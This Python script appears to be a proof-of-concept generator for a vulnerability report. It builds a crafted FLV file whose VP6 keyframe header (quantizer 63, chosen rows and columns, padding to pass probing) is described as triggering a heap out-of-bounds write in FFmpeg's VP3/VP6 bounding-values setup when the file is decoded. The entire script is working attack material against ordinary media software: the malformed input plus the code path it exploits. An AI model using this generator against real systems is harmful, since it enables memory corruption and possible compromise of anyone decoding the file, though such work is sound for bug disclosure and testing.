#!/usr/bin/env python3
"""
PoC generator for Heap OOB Write in ff_vp3dsp_set_bounding_values via VP56 Context.

Vulnerability: ff_vp3dsp_set_bounding_values unconditionally writes to
bounding_values[129..132] which maps to bounding_values_array[256..259],
out-of-bounds for an int bounding_values_array[256] declaration.

The OOB write is triggered via:
  ffmpeg -i crafted.flv -f null -
  -> vp6_parse_header (vp6.c:66)
  -> ff_vp56_init_dequant (vp56.c:39)
  -> ff_vp3dsp_set_bounding_values (vp3dsp.c:498-501)

Key insight: ff_vp56_init_dequant is called at vp6.c line 66, which is
BEFORE any validation of rows/cols/dimensions, so parsing failures after
that point do not prevent the OOB write from occurring.
"""

import struct

def build_flv():
    # ---------------------------------------------------------------
    # VP6 bitstream (this is what vp6_parse_header receives as buf)
    # ---------------------------------------------------------------
    # buf[0]: bit7=0 (keyframe), bits6:1=111111 (qp=63), bit0=0 (no separated_coeff)
    #   qp = (buf[0] >> 1) & 0x3F = 63
    #   ff_vp56_filter_threshold[63] = 2 (the filter_limit passed to set_bounding_values)
    #   ff_vp3dsp_set_bounding_values writes unconditionally to [129..132]
    #   = bounding_values_array[256..259] -- always OOB for a 256-element array
    vp6_byte0 = 0x7E  # keyframe, qp=63, separated_coeff=0

    # buf[1]: sub_version = buf[1]>>3 = 6 (<=8 passes check), filter_header=0, interlace=0
    vp6_byte1 = 0x30  # sub_version=6, no filter_header, not interlaced

    # Since separated_coeff=0 and filter_header=0:
    #   `separated_coeff || !s->filter_header` is True
    #   coeff_offset = AV_RB16(buf+2) - 2, then buf += 2, buf_size -= 2
    # After advance, buf[2] is original buf[4] = rows, buf[3] = original buf[5] = cols
    coeff_offset_field = struct.pack('>H', 10)  # AV_RB16 = 10, coeff_offset = 10-2 = 8

    # Original buf[4] = rows (after advance, becomes new buf[2])
    # Original buf[5] = cols (after advance, becomes new buf[3])
    rows = 2   # 2 macroblocks = 32 pixels height (non-zero to pass sanity check)
    cols = 2   # 2 macroblocks = 32 pixels width  (non-zero to pass sanity check)

    # buf[6] = displayed_rows, buf[7] = displayed_cols (original indices 6+7)
    disp_rows = 2
    disp_cols = 2

    # After advance by 2, range coder init = ff_vpx_init_range_decoder(c, buf+6, buf_size-6)
    # i.e. original buf[8..] -- pad with zeros to avoid buffer under-read.
    # FLV probe requires data_offset + 100 < file_size, i.e. 9 + 100 = 109 bytes minimum.
    # File overhead = 9 + 4 + 11 + 2 (video hdr) + 8 (vp6 fixed) + 4 (prev_tag) = 38 bytes.
    # Need range_coder_data >= 72 to reach 110 bytes total; use 128 for margin.
    range_coder_data = bytes(128)

    vp6_bitstream = bytes([
        vp6_byte0,
        vp6_byte1,
    ]) + coeff_offset_field + bytes([
        rows,
        cols,
        disp_rows,
        disp_cols,
    ]) + range_coder_data

    # ---------------------------------------------------------------
    # FLV VideoData payload
    # ---------------------------------------------------------------
    # byte 0: (frame_type<<4) | codec_id = (1<<4)|4 = 0x14 (keyframe, VP6)
    # byte 1: VP6 extra offset byte (extradata[0]), 1 byte read by FLV demuxer as extradata
    #         This byte is consumed by the demuxer (ret=1 adjustment in flvdec.c:480)
    #         and NOT passed to the VP6 decoder as buf data.
    # bytes 2+: actual VP6 bitstream passed to vp6_parse_header
    video_codec_byte = 0x14        # keyframe (1) + VP6 codec id (4)
    vp6_extra_byte   = 0x00        # crop offset byte (no crop)
    video_data = bytes([video_codec_byte, vp6_extra_byte]) + vp6_bitstream

    # ---------------------------------------------------------------
    # FLV tag structure
    # ---------------------------------------------------------------
    tag_type     = 0x09            # video
    data_size    = len(video_data) # 3 bytes BE
    timestamp    = 0               # milliseconds
    stream_id    = 0               # always 0

    tag_header = struct.pack('>B',  tag_type) + \
                 struct.pack('>I',  data_size)[1:] + \
                 struct.pack('>I',  timestamp)[1:] + \
                 struct.pack('>B',  (timestamp >> 24) & 0xFF) + \
                 struct.pack('>I',  stream_id)[1:]
    tag = tag_header + video_data

    prev_tag_size = struct.pack('>I', len(tag))

    # ---------------------------------------------------------------
    # FLV file header
    # ---------------------------------------------------------------
    flv_signature   = b'FLV'
    flv_version     = struct.pack('>B', 1)
    flv_flags       = struct.pack('>B', 0x01)  # video only
    flv_data_offset = struct.pack('>I', 9)     # header is 9 bytes

    flv_header = flv_signature + flv_version + flv_flags + flv_data_offset
    first_prev_tag_size = struct.pack('>I', 0)  # before first tag

    flv_data = flv_header + first_prev_tag_size + tag + prev_tag_size

    return flv_data


if __name__ == '__main__':
    output_path = 'vuln_001_input.flv'
    data = build_flv()
    with open(output_path, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {output_path}")
    print(f"[+] VP6 quantizer=63 → filter_limit=2")
    print(f"[+] OOB write: bounding_values[129..132] = bounding_values_array[256..259]")
    print(f"[+] Array declared as int[256] — indices 256-259 overflow into adjacent heap")
